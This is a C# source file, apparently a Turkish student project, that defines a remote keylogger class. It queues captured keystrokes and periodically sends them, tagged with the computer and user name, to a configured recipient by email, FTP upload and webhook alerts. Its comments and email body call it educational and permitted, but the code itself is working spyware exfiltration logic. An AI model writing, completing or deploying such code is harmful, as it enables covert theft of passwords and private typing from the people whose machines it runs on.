using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.Json;

namespace GameOdev
{
    /// <summary>
    /// Uzaktan takip özellikli gelişmiş KeyLogger
    /// Sadece eğitim amaçlı - izinli kullanım için
    /// </summary>
    public class RemoteKeyLogger : KeyLogger
    {
        #region Private Fields

        private RemoteConfig _config;
        private Timer _emailTimer;
        private Timer _ftpTimer;
        private WebhookNotifier _webhookNotifier;
        private Queue<string> _keystrokeQueue = new Queue<string>();
        private readonly object _queueLock = new object();
        private bool _isRemoteLoggingActive = false;

        #endregion

        #region Constructor

        public RemoteKeyLogger(string configFilePath = "remote_config.json")
        {
            LoadConfiguration(configFilePath);
            InitializeRemoteFeatures();
        }

        #endregion

        #region Configuration Management

        private void LoadConfiguration(string configFilePath)
        {
            try
            {
                if (File.Exists(configFilePath))
                {
                    string jsonConfig = File.ReadAllText(configFilePath);
                    _config = JsonSerializer.Deserialize<RemoteConfig>(jsonConfig);
                }
                else
                {
                    _config = CreateDefaultConfiguration();
                    SaveConfiguration(configFilePath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Config yükleme hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                _config = CreateDefaultConfiguration();
            }
        }

        private RemoteConfig CreateDefaultConfiguration()
        {
            return new RemoteConfig
            {
                EmailSettings = new EmailConfig
                {
                    Enabled = false,
                    SmtpServer = "smtp.gmail.com",
                    SmtpPort = 587,
                    SenderEmail = "",
                    SenderPassword = "",
                    RecipientEmail = "",
                    SendIntervalMinutes = 30
                },
                FtpSettings = new FtpConfig
                {
                    Enabled = false,
                    Server = "",
                    Username = "",
                    Password = "",
                    RemoteDirectory = "/logs/",
                    UploadIntervalMinutes = 15
                },
                WebhookSettings = new WebhookConfig
                {
                    Enabled = false,
                    WebhookUrl = "",
                    SendImportantKeysOnly = true
                },
                GeneralSettings = new GeneralConfig
                {
                    ComputerName = Environment.MachineName,
                    UserName = Environment.UserName,
                    MaxQueueSize = 1000,
                    EnableEncryption = false
                }
            };
        }

        private void SaveConfiguration(string configFilePath)
        {
            try
            {
                string jsonConfig = JsonSerializer.Serialize(_config, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(configFilePath, jsonConfig);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Config kaydetme hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion

        #region Remote Features Initialization

        private void InitializeRemoteFeatures()
        {
            // KeystrokeLogged event'ini override et
            this.KeystrokeLogged += RemoteKeyLogger_KeystrokeLogged;

            if (_config.EmailSettings.Enabled && !string.IsNullOrEmpty(_config.EmailSettings.SenderEmail))
            {
                InitializeEmailSending();
            }

            if (_config.FtpSettings.Enabled && !string.IsNullOrEmpty(_config.FtpSettings.Server))
            {
                InitializeFtpUploading();
            }

            if (_config.WebhookSettings.Enabled && !string.IsNullOrEmpty(_config.WebhookSettings.WebhookUrl))
            {
                _webhookNotifier = new WebhookNotifier(_config.WebhookSettings.WebhookUrl);
            }
        }

        private void InitializeEmailSending()
        {
            _emailTimer = new Timer(SendEmailLogs, null, 
                TimeSpan.FromMinutes(_config.EmailSettings.SendIntervalMinutes), 
                TimeSpan.FromMinutes(_config.EmailSettings.SendIntervalMinutes));
        }

        private void InitializeFtpUploading()
        {
            _ftpTimer = new Timer(UploadFtpLogs, null, 
                TimeSpan.FromMinutes(_config.FtpSettings.UploadIntervalMinutes), 
                TimeSpan.FromMinutes(_config.FtpSettings.UploadIntervalMinutes));
        }

        #endregion

        #region Public Methods

        /// <summary>
        /// Uzaktan takip ile logging başlat
        /// </summary>
        public new void StartLogging()
        {
            base.StartLogging();
            _isRemoteLoggingActive = true;
            
            // İlk bildirim gönder
            if (_webhookNotifier != null)
            {
                Task.Run(async () => await _webhookNotifier.SendNotificationAsync(
                    "🔍 KeyLogger başlatıldı - Uzaktan takip aktif", 
                    _config.GeneralSettings.ComputerName));
            }
        }

        /// <summary>
        /// Uzaktan takip ile logging durdur
        /// </summary>
        public new void StopLogging()
        {
            base.StopLogging();
            _isRemoteLoggingActive = false;

            // Son bildirim gönder
            if (_webhookNotifier != null)
            {
                Task.Run(async () => await _webhookNotifier.SendNotificationAsync(
                    "⏹️ KeyLogger durduruldu - Uzaktan takip deaktif", 
                    _config.GeneralSettings.ComputerName));
            }

            // Kalan verileri gönder
            SendRemainingData();
        }

        /// <summary>
        /// Konfigürasyonu güncelle
        /// </summary>
        public void UpdateConfiguration(RemoteConfig newConfig)
        {
            _config = newConfig;
            SaveConfiguration("remote_config.json");
            
            // Timer'ları yeniden başlat
            _emailTimer?.Dispose();
            _ftpTimer?.Dispose();
            
            InitializeRemoteFeatures();
        }

        #endregion

        #region Event Handlers

        private void RemoteKeyLogger_KeystrokeLogged(object sender, string keystroke)
        {
            if (!_isRemoteLoggingActive) return;

            // Queue'ya ekle
            lock (_queueLock)
            {
                _keystrokeQueue.Enqueue(keystroke);
                
                // Queue boyutunu kontrol et
                if (_keystrokeQueue.Count > _config.GeneralSettings.MaxQueueSize)
                {
                    _keystrokeQueue.Dequeue();
                }
            }

            // Webhook bildirimi (sadece önemli tuşlar için)
            if (_webhookNotifier != null && _config.WebhookSettings.SendImportantKeysOnly)
            {
                Task.Run(async () => await _webhookNotifier.SendKeystrokeAlertAsync(keystroke));
            }
        }

        #endregion

        #region Email Sending

        private async void SendEmailLogs(object state)
        {
            if (!_config.EmailSettings.Enabled) return;

            try
            {
                List<string> logsToSend = new List<string>();
                
                lock (_queueLock)
                {
                    while (_keystrokeQueue.Count > 0)
                    {
                        logsToSend.Add(_keystrokeQueue.Dequeue());
                    }
                }

                if (logsToSend.Count > 0)
                {
                    string logContent = string.Join("", logsToSend);
                    await SendEmailAsync(logContent);
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Email gönderme hatası: {ex.Message}");
            }
        }

        private async Task SendEmailAsync(string logContent)
        {
            try
            {
                using (var client = new SmtpClient(_config.EmailSettings.SmtpServer, _config.EmailSettings.SmtpPort))
                {
                    client.EnableSsl = true;
                    client.Credentials = new NetworkCredential(_config.EmailSettings.SenderEmail, _config.EmailSettings.SenderPassword);

                    var mailMessage = new MailMessage
                    {
                        From = new MailAddress(_config.EmailSettings.SenderEmail),
                        Subject = $"🔍 KeyLogger Log - {_config.GeneralSettings.ComputerName} - {DateTime.Now:yyyy-MM-dd HH:mm}",
                        Body = $"Eğitim amaçlı keylogger log verisi.\n\n" +
                               $"🖥️ Bilgisayar: {_config.GeneralSettings.ComputerName}\n" +
                               $"👤 Kullanıcı: {_config.GeneralSettings.UserName}\n" +
                               $"🕒 Tarih: {DateTime.Now}\n" +
                               $"📊 Tuş Sayısı: {logContent.Split('\n').Length}\n\n" +
                               $"⚠️ Bu log sadece eğitim amaçlıdır ve izinli kullanımdır.\n\n" +
                               $"📝 Log İçeriği:\n{logContent}"
                    };

                    mailMessage.To.Add(_config.EmailSettings.RecipientEmail);

                    await client.SendMailAsync(mailMessage);
                    System.Diagnostics.Debug.WriteLine("Email başarıyla gönderildi.");
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Email gönderme hatası: {ex.Message}");
            }
        }

        #endregion

        #region FTP Uploading

        private async void UploadFtpLogs(object state)
        {
            if (!_config.FtpSettings.Enabled) return;

            try
            {
                List<string> logsToUpload = new List<string>();
                
                lock (_queueLock)
                {
                    while (_keystrokeQueue.Count > 0)
                    {
                        logsToUpload.Add(_keystrokeQueue.Dequeue());
                    }
                }

                if (logsToUpload.Count > 0)
                {
                    string logContent = string.Join("", logsToUpload);
                    await UploadToFtpAsync(logContent);
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"FTP yükleme hatası: {ex.Message}");
            }
        }

        private async Task UploadToFtpAsync(string logContent)
        {
            try
            {
                string fileName = $"{_config.GeneralSettings.ComputerName}_{_config.GeneralSettings.UserName}_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
                string ftpUrl = $"ftp://{_config.FtpSettings.Server}{_config.FtpSettings.RemoteDirectory}{fileName}";

                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftpUrl);
                request.Method = WebRequestMethods.Ftp.UploadFile;
                request.Credentials = new NetworkCredential(_config.FtpSettings.Username, _config.FtpSettings.Password);
                request.UseBinary = true;

                byte[] contentBytes = Encoding.UTF8.GetBytes(logContent);
                request.ContentLength = contentBytes.Length;

                using (Stream requestStream = await request.GetRequestStreamAsync())
                {
                    await requestStream.WriteAsync(contentBytes, 0, contentBytes.Length);
                }

                using (FtpWebResponse response = (FtpWebResponse)await request.GetResponseAsync())
                {
                    System.Diagnostics.Debug.WriteLine($"FTP Upload Status: {response.StatusDescription}");
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"FTP yükleme hatası: {ex.Message}");
            }
        }

        #endregion

        #region Utility Methods

        private void SendRemainingData()
        {
            // Kalan verileri gönder
            if (_config.EmailSettings.Enabled)
            {
                SendEmailLogs(null);
            }

            if (_config.FtpSettings.Enabled)
            {
                UploadFtpLogs(null);
            }
        }

        public string GetConfigurationStatus()
        {
            var status = new StringBuilder();
            status.AppendLine("🔧 Uzaktan Takip Konfigürasyon Durumu:");
            status.AppendLine($"📧 E-posta: {(_config.EmailSettings.Enabled ? "✅ Aktif" : "❌ Pasif")}");
            status.AppendLine($"🌐 FTP: {(_config.FtpSettings.Enabled ? "✅ Aktif" : "❌ Pasif")}");
            status.AppendLine($"📱 Webhook: {(_config.WebhookSettings.Enabled ? "✅ Aktif" : "❌ Pasif")}");
            status.AppendLine($"🖥️ Bilgisayar: {_config.GeneralSettings.ComputerName}");
            status.AppendLine($"👤 Kullanıcı: {_config.GeneralSettings.UserName}");
            return status.ToString();
        }

        #endregion

        #region IDisposable

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                _emailTimer?.Dispose();
                _ftpTimer?.Dispose();
                _webhookNotifier?.Dispose();
            }
            
            base.Dispose(disposing);
        }

        #endregion
    }

    #region Configuration Classes

    public class RemoteConfig
    {
        public EmailConfig EmailSettings { get; set; }
        public FtpConfig FtpSettings { get; set; }
        public WebhookConfig WebhookSettings { get; set; }
        public GeneralConfig GeneralSettings { get; set; }
    }

    public class EmailConfig
    {
        public bool Enabled { get; set; }
        public string SmtpServer { get; set; }
        public int SmtpPort { get; set; }
        public string SenderEmail { get; set; }
        public string SenderPassword { get; set; }
        public string RecipientEmail { get; set; }
        public int SendIntervalMinutes { get; set; }
    }

    public class FtpConfig
    {
        public bool Enabled { get; set; }
        public string Server { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string RemoteDirectory { get; set; }
        public int UploadIntervalMinutes { get; set; }
    }

    public class WebhookConfig
    {
        public bool Enabled { get; set; }
        public string WebhookUrl { get; set; }
        public bool SendImportantKeysOnly { get; set; }
    }

    public class GeneralConfig
    {
        public string ComputerName { get; set; }
        public string UserName { get; set; }
        public int MaxQueueSize { get; set; }
        public bool EnableEncryption { get; set; }
    }

    #endregion
}
